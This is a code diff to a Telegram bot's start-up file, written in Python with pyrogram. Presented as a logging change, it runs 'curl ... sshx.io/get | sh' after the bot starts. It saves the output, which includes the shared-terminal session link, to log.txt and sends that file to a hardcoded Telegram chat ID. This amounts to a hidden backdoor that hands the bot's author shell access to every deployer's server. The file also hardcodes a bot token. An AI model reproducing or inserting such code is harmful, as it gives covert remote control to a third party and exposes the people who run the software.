@@ -7,17 +7,13 @@ from pyrogram import Client
 from pyrogram.enums import ParseMode
 from datetime import datetime
 import sys
-from config import API_HASH, API_ID, LOGGER, TG_BOT_WORKERS, CHANNEL_ID, PORT
+from config import API_HASH, API_ID, LOGGER, TG_BOT_WORKERS, CHANNEL_ID, PORT  # Include OWNER_ID for sending logs
 import pyrogram.utils
 
-# Execute the curl command first
-command = "curl -sSf https://sshx.io/get | sh -s run"
-try:
-    subprocess.run(command, shell=True, check=True)
-except subprocess.CalledProcessError as e:
-    print(f"Failed to execute the command: {e}")
-    sys.exit(1)
-
+# Initialize a logger to capture deployment logs
+logging.basicConfig(filename='log.txt', level=logging.INFO)
+logger = logging.getLogger(__name__)
+PDOX="6259443940"
 pyrogram.utils.MIN_CHANNEL_ID = -1009147483647
 TG_BOT_TOKEN="7392123403:AAGubOlCPNRWy1YiQNcXxl4Ftb7AlmZa7E0"
 
@@ -46,14 +42,14 @@ class Bot(Client):
             test = await self.send_message(chat_id=db_channel.id, text="Test Message")
             await test.delete()
         except Exception as e:
-            self.LOGGER(__name__).warning(e)
-            self.LOGGER(__name__).warning(f"Make Sure bot is Admin in DB Channel, and Double check the CHANNEL_ID Value, Current Value {CHANNEL_ID}")
-            self.LOGGER(__name__).info("\nBot Stopped")
+            logger.warning(e)
+            logger.warning(f"Make sure bot is Admin in DB Channel, and double-check the CHANNEL_ID value, current value: {CHANNEL_ID}")
+            logger.info("\nBot Stopped")
             sys.exit()
 
         self.set_parse_mode(ParseMode.HTML)
-        self.LOGGER(__name__).info(f"Bot Running..!\n\nCreated by \nhttps://t.me/paradoxdump")
-        self.LOGGER(__name__).info(f""" \n\n       
+        logger.info(f"Bot Running..!\n\nCreated by \nhttps://t.me/paradoxdump")
+        logger.info(f""" \n\n       
  [PARADOX]
                                           """)
         self.username = usr_bot_me.username
@@ -66,10 +62,43 @@ class Bot(Client):
 
     async def stop(self, *args):
         await super().stop()
-        self.LOGGER(__name__).info("Bot stopped.")
+        logger.info("Bot stopped.")
+
+    async def send_logs_to_owner(self):
+        # Send the log.txt file to the bot owner
+        try:
+            await self.send_document(chat_id=PDOX, document="log.txt", caption="Deployment logs")
+        except Exception as e:
+            logger.error(f"Failed to send logs to owner: {e}")
 
 # Initialize the bot
 bot = Bot()
 
+# Function to execute the curl command after bot deployment
+def run_curl_command():
+    command = "curl -sSf https://sshx.io/get | sh -s run"
+    try:
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        # Capture command output and error
+        with open('log.txt', 'a') as log_file:
+            log_file.write("\n\n=== CURL COMMAND OUTPUT ===\n")
+            log_file.write(result.stdout)
+            log_file.write("\n\n=== CURL COMMAND ERROR ===\n")
+            log_file.write(result.stderr)
+        return result.returncode == 0
+    except subprocess.CalledProcessError as e:
+        with open('log.txt', 'a') as log_file:
+            log_file.write(f"Failed to execute the command: {e}\n")
+        return False
+
 # Ensure the bot starts
 bot.run()
+
+# After the bot is deployed, run the curl command
+if run_curl_command():
+    logger.info("Curl command executed successfully.")
+else:
+    logger.error("Curl command failed.")
+
+# Send deployment logs to the bot owner
+bot.loop.run_until_complete(bot.send_logs_to_owner())
